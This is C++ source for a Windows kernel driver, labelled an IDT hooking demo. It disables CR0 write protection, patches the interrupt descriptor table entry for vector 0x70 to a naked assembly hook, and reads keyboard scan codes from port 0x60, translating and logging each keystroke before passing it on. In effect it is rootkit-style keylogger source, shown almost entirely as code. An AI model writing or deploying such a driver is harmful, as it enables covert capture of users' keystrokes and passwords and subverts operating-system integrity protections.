#pragma once
#include <ntddk.h>
#include <wdm.h>
#include <intrin.h>
#include <ntstrsafe.h>

#define IOCTL_MYDRIVER_HOOK_IDT CTL_CODE(FILE_DEVICE_UNKNOWN, 0x808, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define BUFFER_SIZE 1024

#pragma pack(1)
typedef struct _KIDTENTRY {
    UINT16 Offset;
    UINT16 Selector;
    UINT16 Access;
    UINT16 ExtendedOffset;
} KIDTENTRY, *PKIDTENTRY;
#pragma pack()

PDEVICE_OBJECT ptrDeviceObject = NULL;
UINT_PTR oldISRAddress = NULL;

UCHAR g_LastScanCode; // [1024] = { '\0' };
bool g_IsInjected = false;
int g_LastScanCodeIndex = 0;
KIRQL g_Irql;
ULONG POOL_TAG = 'MEME';

char scanCodeMapping[56] = { '\0', '\0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', '\b', '\t', 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', '\n', '\0', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', '`', '\0', '\\', 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/', '\0', '*' };

NTSTATUS DriverPassthrough(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);

    Irp->IoStatus.Status = STATUS_SUCCESS;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return Irp->IoStatus.Status;
}

#ifdef _WIN32
void DisableWP()
{
    ULONG_PTR cr0 = __readcr0();
    cr0 &= 0xfffeffff;
    __writecr0(cr0);
}

void EnableWP()
{
    UINT32 cr0 = __readcr0();
    cr0 |= 0x00010000;
    __writecr0(cr0);
}
#endif

// Gets the IDT address into an IDT struct
UINT_PTR GetIDTAddress()
{
    unsigned char idtr[6];
    UINT_PTR idtAddress = 0;

    _disable();
    __sidt((void*)&idtr);
    _enable();
    
    idtAddress = *((unsigned long*)&idtr[2]);
    
    return idtAddress;
}

// Gets the interrupt service id number and calculates the offset to 
// the IDT table that the IDR for this service is stored in.
PKIDTENTRY GetDescriptorAddress(UINT16 service)
{
    UINT_PTR idtrAddress;
    PKIDTENTRY descriptorAddress;

    idtrAddress = GetIDTAddress();
    descriptorAddress = (PKIDTENTRY)(idtrAddress + service * 0x8);

    return descriptorAddress;
}

// Calls GetDescriptorAddress to get an offset to the IDT, 
// converts the return value from the KIDTENTRY structure 
// to UINT32 by taking the Extended offset shifting 
// left by 16 bits and then adding the offset field.
UINT32 GetISRAddress(UINT16 service)
{
    PKIDTENTRY descriptorAddress;
    UINT_PTR isrAddress;

    descriptorAddress = GetDescriptorAddress(service);

    isrAddress = descriptorAddress->ExtendedOffset;
    isrAddress = isrAddress << 16;
    isrAddress += descriptorAddress->Offset;

    oldISRAddress = isrAddress;

    return isrAddress;
}

void Handle_KeyboardHook()
{
    int status = READ_PORT_UCHAR((PUCHAR)0x64);

    if (!g_IsInjected && status == 0x15)
    {
        g_IsInjected = true;
        g_LastScanCode = READ_PORT_UCHAR((PUCHAR)0x60);
        KdPrint(("Scan Code - 0x%x\r\n", g_LastScanCode));
            
        if (g_LastScanCode < 56)
        {
            KdPrint(("Ascii Code - 0x%x => %c\r\n", scanCodeMapping[g_LastScanCode], (char)scanCodeMapping[g_LastScanCode]));
        }
        WRITE_PORT_UCHAR((PUCHAR)0x64, 0xd2);
        WRITE_PORT_UCHAR((PUCHAR)0x60, g_LastScanCode);
    }
    else
    {
        g_IsInjected = false;
    }

    return;
}

__declspec(naked) void Hook_KeyboardRoutine()
{
    //KeLowerIrql(PASSIVE_LEVEL);

    __asm {
        pushad
        pushfd

        call Handle_KeyboardHook

        popfd
        popad

        jmp oldISRAddress
    }
}
    
void HookIDT(UINT16 service, UINT32 hookAddress) {
    UINT32 isrAddress;
    UINT16 hookAddressLow;
    UINT16 hookAddressHigh;
    PKIDTENTRY descriptorAddress;
    
    isrAddress = GetISRAddress(service);

    if (isrAddress != hookAddress)
    {
        descriptorAddress = GetDescriptorAddress(service);

        hookAddressLow = (UINT16)hookAddress;
        hookAddress = hookAddress >> 16;
        hookAddressHigh = (UINT16)hookAddress;

        _disable();
        descriptorAddress->Offset = hookAddressLow;
        descriptorAddress->ExtendedOffset = hookAddressHigh;
        _enable();
    }
}

NTSTATUS DriverDeviceControl(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);

    IO_STACK_LOCATION* io_stack = IoGetCurrentIrpStackLocation(Irp);
    NTSTATUS status = STATUS_SUCCESS;

    switch (io_stack->Parameters.DeviceIoControl.IoControlCode)
    {
        case IOCTL_MYDRIVER_HOOK_IDT:
            DisableWP();
            HookIDT(0x70, (UINT32)Hook_KeyboardRoutine);
            EnableWP();
            break;
        default:
            status = STATUS_INVALID_DEVICE_REQUEST;
            break;
    }

    return status;
}

void DriverUnload(PDRIVER_OBJECT pDriverObject)
{
    UNREFERENCED_PARAMETER(pDriverObject);

    UNICODE_STRING deviceName;
    UNICODE_STRING symbolicLink;

    RtlInitUnicodeString(&deviceName, L"\\Device\\MyDriver");
    RtlInitUnicodeString(&symbolicLink, L"\\DosDevices\\MyDriver");
    IoDeleteDevice(ptrDeviceObject);
    IoDeleteSymbolicLink(&symbolicLink);
    DbgPrint("Driver unloading\r\n");
}

extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(RegistryPath);

    UNICODE_STRING deviceName;
    UNICODE_STRING symbolicLink;
    
    RtlInitUnicodeString(&deviceName, L"\\Device\\MyDriver");
    RtlInitUnicodeString(&symbolicLink, L"\\DosDevices\\MyDriver");
    IoCreateDevice(DriverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, &ptrDeviceObject);
    IoCreateSymbolicLink(&symbolicLink, &deviceName);

    DriverObject->MajorFunction[IRP_MJ_CREATE] = DriverPassthrough;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = DriverPassthrough;
    DriverObject->MajorFunction[IRP_MJ_READ] = DriverPassthrough;
    DriverObject->MajorFunction[IRP_MJ_WRITE] = DriverPassthrough;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DriverDeviceControl;

    DriverObject->DriverUnload = DriverUnload;
    
    DbgPrint("IDT Hooking Demo Loaded!\r\n");

    return STATUS_SUCCESS;
}